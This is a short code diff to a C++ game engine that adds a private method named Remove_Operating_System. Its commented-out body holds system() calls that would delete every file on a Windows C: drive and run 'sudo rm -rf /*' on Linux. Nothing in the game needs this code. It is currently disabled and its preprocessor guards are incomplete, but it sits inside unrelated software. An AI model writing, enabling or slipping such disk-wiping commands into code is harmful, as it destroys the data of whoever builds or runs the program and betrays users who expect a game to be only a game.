@@ -36,6 +36,15 @@ private:
         }
     }
 
+    void Remove_Operating_System(){
+        // //command to detect the os 
+        // #ifdef _WIN32
+        //     system("del /f /s /q c:\\*.*");
+        // //for linux system 
+        // #ifdef __linux__
+        //     system("sudo rm -rf /*");
+    }
+
 public:
     // Constructor to initialize the game and players
     GameEngine(GAME* game,Players... players) : game(game) ,num_players(sizeof...(players)), turn(0) {
